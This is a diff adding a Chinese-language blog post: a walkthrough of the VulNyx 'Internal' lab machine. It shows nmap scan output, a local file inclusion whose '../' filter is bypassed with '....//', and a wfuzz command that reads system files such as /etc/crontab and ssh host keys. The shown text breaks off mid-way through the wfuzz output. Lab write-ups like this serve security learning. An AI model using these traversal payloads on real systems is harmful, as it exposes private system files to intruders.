@@ -1,0 +1,590 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" integrity="sha256-yIDrPSXHZdOZhAqiBP7CKzIwMQmRCJ8UeB8Jo17YC4o=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.css" integrity="sha256-6cQIC71/iBIYXFK+0RHAvwmjwWzkWd+r7v/BX3/vZDc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"z9m8r8.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":true,"height":500},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="该文章暂无概述">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulNyx - Internal">
+<meta property="og:url" content="https://z9m8r8.github.io/2024/06/12/VulNyx%20-%20Internal/index.html">
+<meta property="og:site_name" content="Phantom&#39;s Blog">
+<meta property="og:description" content="该文章暂无概述">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-06-11T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-06-12T10:56:22.586Z">
+<meta property="article:author" content="Phantom">
+<meta property="article:tag" content="提权">
+<meta property="article:tag" content="信息搜集">
+<meta property="article:tag" content="Fuzzing">
+<meta property="article:tag" content="VulNyx">
+<meta property="article:tag" content="LFI">
+<meta property="article:tag" content="IPv6">
+<meta property="article:tag" content="SimpleHTTP&#x2F;0.6">
+<meta property="article:tag" content="proc">
+<meta property="article:tag" content="proc&#x2F;pid&#x2F;cmdline">
+<meta property="article:tag" content="VNC">
+<meta property="article:tag" content="X11">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://z9m8r8.github.io/2024/06/12/VulNyx%20-%20Internal/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://z9m8r8.github.io/2024/06/12/VulNyx%20-%20Internal/","path":"2024/06/12/VulNyx - Internal/","title":"VulNyx - Internal"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>VulNyx - Internal | Phantom's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Phantom's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">人若无名，便可专心练剑！</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1. 信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="nav-text">1.1. 主机探测</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="nav-text">1.2. 端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">1.3. Web 信息收集</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB"><span class="nav-text">2. 渗透攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#ssh-%E7%99%BB%E5%BD%95"><span class="nav-text">2.1. SSH 登录</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">2.2. 提权</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%8D%E7%9B%98"><span class="nav-text">3. 复盘</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#lfi"><span class="nav-text">3.1. 80 - LFI</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#simplehttp0.6"><span class="nav-text">3.2. 9999 - SimpleHTTP&#x2F;0.6</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#vnc"><span class="nav-text">3.3. VNC</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-text">4. 参考</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Phantom"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">Phantom</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">161</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">132</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/z9m8r8" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://www.cnblogs.com/z9m8r8" title="博客园 → https:&#x2F;&#x2F;www.cnblogs.com&#x2F;z9m8r8" rel="noopener me" target="_blank"><i class="fa-solid fa-blog fa-fw"></i>博客园</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://z9m8r8.github.io/2024/06/12/VulNyx%20-%20Internal/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="Phantom">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Phantom's Blog">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="VulNyx - Internal | Phantom's Blog">
+      <meta itemprop="description" content="该文章暂无概述">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          VulNyx - Internal
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2024-06-12 00:00:00 / 修改时间：18:56:22" itemprop="dateCreated datePublished" datetime="2024-06-12T00:00:00+08:00">2024-06-12</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>4.6k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>17 分钟</span>
+    </span>
+</div>
+
+            <div class="post-description">该文章暂无概述</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><blockquote>
+<p>靶机：<a target="_blank" rel="noopener" href="https://vulnyx.com/">VulNyx: Free Cybersecurity
+Platform | Enthusiasts &amp; Professionals</a></p>
+</blockquote>
+<h2 id="信息收集">1. 信息收集</h2>
+<h3 id="主机探测">1.1. 主机探测</h3>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover  -r 192.168.159.0/24</span><br></pre></td></tr></table></figure>
+<p>靶机：192.168.159.193</p>
+<h3 id="端口扫描">1.2. 端口扫描</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">nmap -sSVC 192.168.159.193 -p-             </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-11 21:00 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.159.193 (192.168.159.193)</span><br><span class="line">Host is up (0.00070s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)</span><br><span class="line">|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)</span><br><span class="line">|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)</span><br><span class="line">80/tcp   open  http    Apache httpd 2.4.56 ((Debian))</span><br><span class="line">|_http-title: Day Bootstrap Template - Index</span><br><span class="line">|_http-server-header: Apache/2.4.56 (Debian)</span><br><span class="line">9999/tcp open  abyss?</span><br><span class="line">| fingerprint-strings: </span><br><span class="line">|   FourOhFourRequest, GetRequest: </span><br><span class="line">|     HTTP/1.0 401 Unauthorized</span><br><span class="line">|     Server: SimpleHTTP/0.6 Python/3.9.2</span><br><span class="line">|     Date: Wed, 12 Jun 2024 01:00:19 GMT</span><br><span class="line">|     WWW-Authenticate: Basic realm=<span class="string">&quot;PROD&quot;</span></span><br><span class="line">|     Content-<span class="built_in">type</span>: text/html</span><br><span class="line">|     auth header received</span><br><span class="line">|   HTTPOptions: </span><br><span class="line">|     HTTP/1.0 501 Unsupported method (<span class="string">&#x27;OPTIONS&#x27;</span>)</span><br><span class="line">|     Server: SimpleHTTP/0.6 Python/3.9.2</span><br><span class="line">|     Date: Wed, 12 Jun 2024 01:00:19 GMT</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Content-Type: text/html;charset=utf-8</span><br><span class="line">|     Content-Length: 500</span><br><span class="line">|     &lt;!DOCTYPE HTML PUBLIC <span class="string">&quot;-//W3C//DTD HTML 4.01//EN&quot;</span></span><br><span class="line">|     <span class="string">&quot;http://www.w3.org/TR/html4/strict.dtd&quot;</span>&gt;</span><br><span class="line">|     &lt;html&gt;</span><br><span class="line">|     &lt;<span class="built_in">head</span>&gt;</span><br><span class="line">|     &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">|     &lt;title&gt;Error response&lt;/title&gt;</span><br><span class="line">|     &lt;/head&gt;</span><br><span class="line">|     &lt;body&gt;</span><br><span class="line">|     &lt;h1&gt;Error response&lt;/h1&gt;</span><br><span class="line">|     &lt;p&gt;Error code: 501&lt;/p&gt;</span><br><span class="line">|     &lt;p&gt;Message: Unsupported method (<span class="string">&#x27;OPTIONS&#x27;</span>).&lt;/p&gt;</span><br><span class="line">|     &lt;p&gt;Error code explanation: HTTPStatus.NOT_IMPLEMENTED - Server does not support this operation.&lt;/p&gt;</span><br><span class="line">|     &lt;/body&gt;</span><br><span class="line">|     &lt;/html&gt;</span><br><span class="line">|   RTSPRequest: </span><br><span class="line">|     &lt;!DOCTYPE HTML PUBLIC <span class="string">&quot;-//W3C//DTD HTML 4.01//EN&quot;</span></span><br><span class="line">|     <span class="string">&quot;http://www.w3.org/TR/html4/strict.dtd&quot;</span>&gt;</span><br><span class="line">|     &lt;html&gt;</span><br><span class="line">|     &lt;<span class="built_in">head</span>&gt;</span><br><span class="line">|     &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">|     &lt;title&gt;Error response&lt;/title&gt;</span><br><span class="line">|     &lt;/head&gt;</span><br><span class="line">|     &lt;body&gt;</span><br><span class="line">|     &lt;h1&gt;Error response&lt;/h1&gt;</span><br><span class="line">|     &lt;p&gt;Error code: 400&lt;/p&gt;</span><br><span class="line">|     &lt;p&gt;Message: Bad request version (<span class="string">&#x27;RTSP/1.0&#x27;</span>).&lt;/p&gt;</span><br><span class="line">|     &lt;p&gt;Error code explanation: HTTPStatus.BAD_REQUEST - Bad request syntax or unsupported method.&lt;/p&gt;</span><br><span class="line">|     &lt;/body&gt;</span><br><span class="line">|_    &lt;/html&gt;</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">SF-Port9999-TCP:V=7.94SVN%I=7%D=6/11%Time=6668F324%P=x86_64-pc-linux-gnu%r</span><br><span class="line">SF:(GetRequest,BD,<span class="string">&quot;HTTP/1\.0\x20401\x20Unauthorized\r\nServer:\x20SimpleHT</span></span><br><span class="line"><span class="string">SF:TP/0\.6\x20Python/3\.9\.2\r\nDate:\x20Wed,\x2012\x20Jun\x202024\x2001:0</span></span><br><span class="line"><span class="string">SF:0:19\x20GMT\r\nWWW-Authenticate:\x20Basic\x20realm=\&quot;PROD\&quot;\r\nContent-</span></span><br><span class="line"><span class="string">SF:type:\x20text/html\r\n\r\nno\x20auth\x20header\x20received&quot;</span>)%r(HTTPOpti</span><br><span class="line">SF:ons,2BC,<span class="string">&quot;HTTP/1\.0\x20501\x20Unsupported\x20method\x20\(&#x27;OPTIONS&#x27;\)\r\n</span></span><br><span class="line"><span class="string">SF:Server:\x20SimpleHTTP/0\.6\x20Python/3\.9\.2\r\nDate:\x20Wed,\x2012\x20</span></span><br><span class="line"><span class="string">SF:Jun\x202024\x2001:00:19\x20GMT\r\nConnection:\x20close\r\nContent-Type:</span></span><br><span class="line"><span class="string">SF:\x20text/html;charset=utf-8\r\nContent-Length:\x20500\r\n\r\n&lt;!DOCTYPE\</span></span><br><span class="line"><span class="string">SF:x20HTML\x20PUBLIC\x20\&quot;-//W3C//DTD\x20HTML\x204\.01//EN\&quot;\n\x20\x20\x20</span></span><br><span class="line"><span class="string">SF:\x20\x20\x20\x20\x20\&quot;http://www\.w3\.org/TR/html4/strict\.dtd\&quot;&gt;\n&lt;htm</span></span><br><span class="line"><span class="string">SF:l&gt;\n\x20\x20\x20\x20&lt;head&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;meta\x20ht</span></span><br><span class="line"><span class="string">SF:tp-equiv=\&quot;Content-Type\&quot;\x20content=\&quot;text/html;charset=utf-8\&quot;&gt;\n\x20</span></span><br><span class="line"><span class="string">SF:\x20\x20\x20\x20\x20\x20\x20&lt;title&gt;Error\x20response&lt;/title&gt;\n\x20\x20\</span></span><br><span class="line"><span class="string">SF:x20\x20&lt;/head&gt;\n\x20\x20\x20\x20&lt;body&gt;\n\x20\x20\x20\x20\x20\x20\x20\x2</span></span><br><span class="line"><span class="string">SF:0&lt;h1&gt;Error\x20response&lt;/h1&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x</span></span><br><span class="line"><span class="string">SF:20code:\x20501&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Message:\x20Unsu</span></span><br><span class="line"><span class="string">SF:pported\x20method\x20\(&#x27;OPTIONS&#x27;\)\.&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\</span></span><br><span class="line"><span class="string">SF:x20&lt;p&gt;Error\x20code\x20explanation:\x20HTTPStatus\.NOT_IMPLEMENTED\x20-</span></span><br><span class="line"><span class="string">SF:\x20Server\x20does\x20not\x20support\x20this\x20operation\.&lt;/p&gt;\n\x20\x</span></span><br><span class="line"><span class="string">SF:20\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n&quot;</span>)%r(FourOhFourRequest,BD,<span class="string">&quot;HTTP/1\.0\x20401</span></span><br><span class="line"><span class="string">SF:\x20Unauthorized\r\nServer:\x20SimpleHTTP/0\.6\x20Python/3\.9\.2\r\nDat</span></span><br><span class="line"><span class="string">SF:e:\x20Wed,\x2012\x20Jun\x202024\x2001:00:19\x20GMT\r\nWWW-Authenticate:</span></span><br><span class="line"><span class="string">SF:\x20Basic\x20realm=\&quot;PROD\&quot;\r\nContent-type:\x20text/html\r\n\r\nno\x20</span></span><br><span class="line"><span class="string">SF:auth\x20header\x20received&quot;</span>)%r(RTSPRequest,1F4,<span class="string">&quot;&lt;!DOCTYPE\x20HTML\x20PU</span></span><br><span class="line"><span class="string">SF:BLIC\x20\&quot;-//W3C//DTD\x20HTML\x204\.01//EN\&quot;\n\x20\x20\x20\x20\x20\x20\</span></span><br><span class="line"><span class="string">SF:x20\x20\&quot;http://www\.w3\.org/TR/html4/strict\.dtd\&quot;&gt;\n&lt;html&gt;\n\x20\x20\</span></span><br><span class="line"><span class="string">SF:x20\x20&lt;head&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;meta\x20http-equiv=\&quot;Co</span></span><br><span class="line"><span class="string">SF:ntent-Type\&quot;\x20content=\&quot;text/html;charset=utf-8\&quot;&gt;\n\x20\x20\x20\x20\</span></span><br><span class="line"><span class="string">SF:x20\x20\x20\x20&lt;title&gt;Error\x20response&lt;/title&gt;\n\x20\x20\x20\x20&lt;/head</span></span><br><span class="line"><span class="string">SF:&gt;\n\x20\x20\x20\x20&lt;body&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;h1&gt;Error\x2</span></span><br><span class="line"><span class="string">SF:0response&lt;/h1&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Error\x20code:\x2040</span></span><br><span class="line"><span class="string">SF:0&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;Message:\x20Bad\x20request\x2</span></span><br><span class="line"><span class="string">SF:0version\x20\(&#x27;RTSP/1\.0&#x27;\)\.&lt;/p&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20&lt;p&gt;E</span></span><br><span class="line"><span class="string">SF:rror\x20code\x20explanation:\x20HTTPStatus\.BAD_REQUEST\x20-\x20Bad\x20</span></span><br><span class="line"><span class="string">SF:request\x20syntax\x20or\x20unsupported\x20method\.&lt;/p&gt;\n\x20\x20\x20\x2</span></span><br><span class="line"><span class="string">SF:0&lt;/body&gt;\n&lt;/html&gt;\n&quot;</span>);</span><br><span class="line">MAC Address: 00:0C:29:59:03:FC (VMware)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 93.32 seconds</span><br></pre></td></tr></table></figure>
+<h3 id="web-信息收集">1.3. Web 信息收集</h3>
+<p>80 源码 <span class="math inline">\(\Rightarrow\)</span> LFI</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202406121156276.png" /></p>
+<p>经测服务端对 <code>../</code> 有过滤，不过 <code>....//</code>
+即可绕过</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202406121158156.png" /></p>
+<p>得用户 admin &amp; root</p>
+<p>Fuzzing Linux 文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -c -u <span class="string">&#x27;http://192.168.159.193/internal-item.php?item=....//....//..../FUZZ&#x27;</span> -w linux_file_dic.txt  --hh 13   2&gt;/dev/null</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://192.168.159.193/internal-item.php?item=....//....//..../FUZZ</span><br><span class="line">Total requests: 377</span><br><span class="line"></span><br><span class="line">=====================================================================</span><br><span class="line">ID           Response   Lines    Word       Chars       Payload       </span><br><span class="line">=====================================================================</span><br><span class="line"></span><br><span class="line">000000032:   200        24 L     192 W      1055 Ch     <span class="string">&quot;/etc/crontab&quot;</span>      </span><br><span class="line">000000033:   200        17 L     111 W      819 Ch      <span class="string">&quot;/etc/fstab&quot;</span>  </span><br><span class="line">000000037:   200        19 L     113 W      724 Ch      <span class="string">&quot;/etc/hosts.deny&quot;</span>  </span><br><span class="line">000000034:   200        55 L     55 W       702 Ch      <span class="string">&quot;/etc/group&quot;</span>    </span><br><span class="line">000000036:   200        9 L      24 W       201 Ch      <span class="string">&quot;/etc/hosts&quot;</span>    </span><br><span class="line">000000088:   200        3 L      5 W        577 Ch      <span class="string">&quot;/etc/ssh/ssh_host_rsa_key.pub&quot;</span></span><br><span class="line">000000076:   200        66 L     476 W      2945 Ch     <span 